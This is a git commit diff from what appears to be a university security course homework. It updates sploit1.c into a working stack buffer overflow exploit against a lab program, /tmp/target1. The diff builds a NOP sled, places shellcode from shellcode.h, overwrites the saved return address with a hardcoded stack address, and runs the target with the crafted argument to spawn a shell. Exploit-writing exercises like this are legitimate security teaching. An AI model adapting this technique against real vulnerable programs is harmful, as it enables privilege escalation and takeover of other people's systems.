dd56e3a7cb53fd09dc29a9b21c6b43424230efbb
Shawn Zhong <github@shawnzhong.com>
2020-04-11 00:01:16 -0500

    Update sploit1.c

--- HW4/sploits/sploit1.c
+++ HW4/sploits/sploit1.c
@@ -1,17 +1,26 @@
+#include "shellcode.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include "shellcode.h"
 
 #define TARGET "/tmp/target1"
+#define NOP 0x90
 
-int main(void)
-{
+int main(void) {
   char *args[3];
   char *env[1];
+  char buf[169];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  int shell_len = strlen(shellcode);
+
+  memset(buf, NOP, 168);
+  memcpy(buf + 160 - shell_len, shellcode, shell_len);
+  strcpy(buf + 164, "\x38\xfd\xff\xbf");
+
+  args[0] = TARGET;
+  args[1] = buf;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
